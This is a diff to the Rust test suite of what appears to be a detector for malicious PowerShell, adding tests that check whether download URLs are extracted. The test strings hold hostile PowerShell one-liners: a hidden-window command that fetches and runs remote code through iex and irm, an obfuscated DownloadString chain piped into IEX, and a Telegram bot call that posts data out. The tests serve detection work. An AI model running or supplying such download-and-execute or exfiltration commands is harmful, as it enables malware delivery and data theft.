@@ -12674,6 +12674,48 @@ mod ps1_var_substitution_tests {
     }
 
     #[test]
+    fn ps_braced_variable_interpolation_in_url_resolves() {
+        let inner = r#"$TOKEN = '123:abc'; $TG = "https://api.telegram.org/bot${TOKEN}"; Invoke-RestMethod -Uri "$TG/sendMessage" -Method Post"#;
+        let script = format!("powershell -Command \"{}\"\r\n", inner);
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src.contains("api.telegram.org/bot123:abc/sendMessage")
+            )
+        });
+        assert!(
+            has,
+            "no Download from braced variable URL interpolation: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn ps_outer_command_quotes_do_not_expand_assignment_lhs() {
+        let script = r#"powershell -w h "$u='https://files.catbox.moe/5rvuod.txt';iex(irm $u)""#;
+        let report = analyze(script.as_bytes(), &Config::default());
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(t,
+                    Trait::Download { src, .. } if src == "https://files.catbox.moe/5rvuod.txt"
+                )
+            }),
+            "expected clean Download trait: {:?}",
+            report.traits
+        );
+        assert!(
+            !report.traits.iter().any(|t| {
+                matches!(t,
+                    Trait::Download { src, .. } | Trait::DownloadInDeobText { src, .. }
+                        if src.contains("5rvuod.txt=")
+                )
+            }),
+            "assignment LHS was expanded into a bogus URL: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn ps_command_concat_from_bound_variables_resolves_downloadstring() {
         let inner = r#"$var1='(New-Ob';$var2='ject Net.Web';$var3='Client)';$var4='.DownloadString(';$var5='''http://92.255.85.2/a.mp4''';$var6=')';$command=$var1+$var2+$var3+$var4+$var5+$var6;IEX $command|IEX"#;
         let script = format!("powershell -Command \"{}\"\r\n", inner);
